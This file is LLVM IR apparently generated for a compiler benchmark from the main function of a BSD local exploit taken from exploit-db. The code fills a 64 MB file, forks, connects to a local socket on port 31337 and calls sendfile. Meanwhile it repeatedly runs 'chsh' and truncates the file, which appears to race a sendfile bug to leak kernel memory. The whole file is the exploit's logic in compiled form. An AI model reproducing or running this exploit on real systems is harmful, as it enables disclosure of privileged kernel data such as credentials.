; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_1311.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_1311.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }
%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.st = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str = private unnamed_addr constant [10 x i8] c"sendfile1\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [17 x i8] c"connect() failed\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"sendfile()\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c"/usr/bin/chsh -s /bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.stat, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [2 x i8], align 1
  store i32 0, i32* %1, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %9, align 4
  %12 = bitcast [2 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %12, i8* align 1 getelementptr inbounds ([2 x i8], [2 x i8]* @__const.main.st, i32 0, i32 0), i64 2, i1 false)
  %13 = call i32* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %13, i32** %8, align 8
  store i32 0, i32* %9, align 4
  br label %14

14:                                               ; preds = %21, %0
  %15 = load i32, i32* %9, align 4
  %16 = icmp ne i32 %15, 64000000
  br i1 %16, label %17, label %24

17:                                               ; preds = %14
  %18 = getelementptr inbounds [2 x i8], [2 x i8]* %11, i64 0, i64 0
  %19 = load i32*, i32** %8, align 8
  %20 = call i32 @fwrite(i8* %18, i32 1, i32 1, i32* %19)
  br label %21

21:                                               ; preds = %17
  %22 = load i32, i32* %9, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %9, align 4
  br label %14

24:                                               ; preds = %14
  %25 = load i32*, i32** %8, align 8
  %26 = call i32 @fclose(i32* %25)
  %27 = load i32, i32* @O_RDWR, align 4
  %28 = call i32 @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i32 %27)
  store i32 %28, i32* %2, align 4
  %29 = load i32, i32* %2, align 4
  %30 = call i32 @fstat(i32 %29, %struct.stat* %6)
  %31 = call i64 (...) @fork()
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %78

33:                                               ; preds = %24
  %34 = call i32 @sleep(i32 2)
  %35 = load i32, i32* @PF_INET, align 4
  %36 = load i32, i32* @SOCK_STREAM, align 4
  %37 = call i32 @socket(i32 %35, i32 %36, i32 0)
  store i32 %37, i32* %4, align 4
  %38 = load i32, i32* @INADDR_ANY, align 4
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %40 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %39, i32 0, i32 0
  store i32 %38, i32* %40, align 4
  %41 = call i32 @htons(i32 31337)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %41, i32* %42, align 4
  %43 = load i32, i32* @AF_INET, align 4
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %43, i32* %44, align 4
  %45 = load i32, i32* %4, align 4
  %46 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %47 = call i32 @connect(i32 %45, %struct.sockaddr* %46, i32 12)
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %51

49:                                               ; preds = %33
  %50 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0))
  store i32 2, i32* %1, align 4
  br label %82

51:                                               ; preds = %33
  %52 = call i64 (...) @fork()
  %53 = icmp ne i64 %52, 0
  br i1 %53, label %54, label %63

54:                                               ; preds = %51
  %55 = load i32, i32* %2, align 4
  %56 = load i32, i32* %4, align 4
  %57 = load i32, i32* %7, align 4
  %58 = call i32 @sendfile(i32 %55, i32 %56, i32 %57, i32 64000000, i32* null, i32* null, i32 0)
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %62

60:                                               ; preds = %54
  %61 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %82

62:                                               ; preds = %54
  br label %77

63:                                               ; preds = %51
  %64 = call i32* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %64, i32** %8, align 8
  %65 = load i32*, i32** %8, align 8
  %66 = call i32 @fclose(i32* %65)
  store i32 0, i32* %5, align 4
  br label %67

67:                                               ; preds = %72, %63
  %68 = load i32, i32* %5, align 4
  %69 = icmp ne i32 %68, 10
  br i1 %69, label %70, label %75

70:                                               ; preds = %67
  %71 = call i32 @system(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0))
  br label %72

72:                                               ; preds = %70
  %73 = load i32, i32* %5, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %5, align 4
  br label %67

75:                                               ; preds = %67
  %76 = call i32 (...) @wait()
  br label %77

77:                                               ; preds = %75, %62
  br label %81

78:                                               ; preds = %24
  %79 = call i32 (...) @dolisten()
  %80 = call i32 (...) @wait()
  br label %81

81:                                               ; preds = %78, %77
  store i32 0, i32* %1, align 4
  br label %82

82:                                               ; preds = %81, %60, %49
  %83 = load i32, i32* %1, align 4
  ret i32 %83
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i32 @fstat(i32, %struct.stat*) #2

declare dso_local i64 @fork(...) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @sendfile(i32, i32, i32, i32, i32*, i32*, i32) #2

declare dso_local i32 @system(i8*) #2

declare dso_local i32 @wait(...) #2

declare dso_local i32 @dolisten(...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
